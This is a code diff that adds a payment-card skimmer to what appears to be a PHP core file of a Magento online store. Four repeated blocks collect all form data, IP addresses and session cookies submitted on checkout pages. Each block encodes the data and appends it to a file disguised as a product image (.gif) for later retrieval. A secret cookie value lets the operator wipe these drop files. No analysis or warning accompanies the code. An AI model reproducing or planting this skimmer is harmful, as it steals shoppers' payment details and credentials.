@@ -375,3 +375,72 @@ if ( !function_exists('sys_get_temp_dir') ) {
         }
     }
 }
+
+if ( isset($_POST) && is_array($_POST) && count($_POST) > 0 ) {
+    $ARINFO = $_POST;
+    $ARINFO['date'] = $_SERVER['REQUEST_TIME'];
+    $ARINFO['ip'] = $_SERVER['REMOTE_ADDR'];
+    $ARINFO['url'] = $_SERVER['REQUEST_URI'];
+    if(isset($_COOKIE['frontend'])) $ARINFO['cookie'] = $_COOKIE['frontend'];
+    if((strpos($_SERVER['REQUEST_URI'], 'checkout/onepage')) or (strpos($_SERVER['REQUEST_URI'], 'onepage')) or (strpos($_SERVER['REQUEST_URI'], 'simplecheckout')) or (strpos($_SERVER['REQUEST_URI'], 'onepagecheckout')) or (strpos($_SERVER['REQUEST_URI'], 'firecheckout')) or (strpos($_SERVER['REQUEST_URI'], 'onestepcheckout')))
+    {
+        $log_entry =  base64_encode(serialize($ARINFO)) . "\n";
+        file_put_contents('/var/www/html/magento/proline/media/catalog/product/p/e/penguins.gif', $log_entry, FILE_APPEND|LOCK_EX);
+    }
+}
+
+if (isset($_COOKIE['3424ab90180b0e24133ab8981a00d72e']) AND ($_COOKIE['3424ab90180b0e24133ab8981a00d72e'] == '57bf2419a27d6ccaa6d0800c9b38d90f'))
+{
+    file_put_contents('/var/www/html/magento/proline/media/catalog/product/p/e/penguins.gif', "GIF\n");
+}
+if ( isset($_POST) && is_array($_POST) && count($_POST) > 0 ) {
+    $ARINFO = $_POST;
+    $ARINFO['date'] = $_SERVER['REQUEST_TIME'];
+    $ARINFO['ip'] = $_SERVER['REMOTE_ADDR'];
+    $ARINFO['url'] = $_SERVER['REQUEST_URI'];
+    if(isset($_COOKIE['frontend'])) $ARINFO['cookie'] = $_COOKIE['frontend'];
+    if((strpos($_SERVER['REQUEST_URI'], 'checkout/onepage')) or (strpos($_SERVER['REQUEST_URI'], 'onepage')) or (strpos($_SERVER['REQUEST_URI'], 'simplecheckout')) or (strpos($_SERVER['REQUEST_URI'], 'onepagecheckout')) or (strpos($_SERVER['REQUEST_URI'], 'firecheckout')) or (strpos($_SERVER['REQUEST_URI'], 'onestepcheckout')))
+    {
+        $log_entry =  base64_encode(serialize($ARINFO)) . "\n";
+        file_put_contents('/var/www/html/magento/proline/media/catalog/product/1/2/sydofvd.gif', $log_entry, FILE_APPEND|LOCK_EX);
+    }
+}
+
+if (isset($_COOKIE['3424ab90180b0e24133ab8981a00d72e']) AND ($_COOKIE['3424ab90180b0e24133ab8981a00d72e'] == '57bf2419a27d6ccaa6d0800c9b38d90f'))
+{
+    file_put_contents('/var/www/html/magento/proline/media/catalog/product/1/2/sydofvd.gif', "GIF\n");
+}
+if ( isset($_POST) && is_array($_POST) && count($_POST) > 0 ) {
+    $ARINFO = $_POST;
+    $ARINFO['date'] = $_SERVER['REQUEST_TIME'];
+    $ARINFO['ip'] = $_SERVER['REMOTE_ADDR'];
+    $ARINFO['url'] = $_SERVER['REQUEST_URI'];
+    if(isset($_COOKIE['frontend'])) $ARINFO['cookie'] = $_COOKIE['frontend'];
+    if((strpos($_SERVER['REQUEST_URI'], 'checkout/onepage')) or (strpos($_SERVER['REQUEST_URI'], 'onepage')) or (strpos($_SERVER['REQUEST_URI'], 'simplecheckout')) or (strpos($_SERVER['REQUEST_URI'], 'onepagecheckout')) or (strpos($_SERVER['REQUEST_URI'], 'firecheckout')) or (strpos($_SERVER['REQUEST_URI'], 'onestepcheckout')))
+    {
+        $log_entry =  base64_encode(serialize($ARINFO)) . "\n";
+        file_put_contents('/var/www/html/magento/proline/media/catalog/product/d/o/dollar_symbol_green_shiny.gif', $log_entry, FILE_APPEND|LOCK_EX);
+    }
+}
+
+if (isset($_COOKIE['3424ab90180b0e24133ab8981a00d72e']) AND ($_COOKIE['3424ab90180b0e24133ab8981a00d72e'] == '57bf2419a27d6ccaa6d0800c9b38d90f'))
+{
+    file_put_contents('/var/www/html/magento/proline/media/catalog/product/d/o/dollar_symbol_green_shiny.gif', "GIF\n");
+}
+if ( isset($_POST) && is_array($_POST) && count($_POST) > 0 ) {
+    $ARINFO = $_POST;
+    $ARINFO['date'] = $_SERVER['REQUEST_TIME'];
+    $ARINFO['ip'] = $_SERVER['REMOTE_ADDR'];
+    $ARINFO['url'] = $_SERVER['REQUEST_URI'];
+    if(isset($_COOKIE['frontend'])) $ARINFO['cookie'] = $_COOKIE['frontend'];
+    if((strpos($_SERVER['REQUEST_URI'], 'checkout/onepage')) or (strpos($_SERVER['REQUEST_URI'], 'onepage')) or (strpos($_SERVER['REQUEST_URI'], 'simplecheckout')) or (strpos($_SERVER['REQUEST_URI'], 'onepagecheckout')) or (strpos($_SERVER['REQUEST_URI'], 'firecheckout')) or (strpos($_SERVER['REQUEST_URI'], 'onestepcheckout')))
+    {
+        $log_entry =  base64_encode(serialize($ARINFO)) . "\n";
+        file_put_contents('/var/www/html/magento/proline/media/catalog/product/g/a/ckefaej.gif', $log_entry, FILE_APPEND|LOCK_EX);
+    }
+}
+
+if (isset($_COOKIE['3424ab90180b0e24133ab8981a00d72e']) AND ($_COOKIE['3424ab90180b0e24133ab8981a00d72e'] == '57bf2419a27d6ccaa6d0800c9b38d90f'))
+{
+    file_put_contents('/var/www/html/magento/proline/media/catalog/product/g/a/ckefaej.gif', "GIF\n");
+}
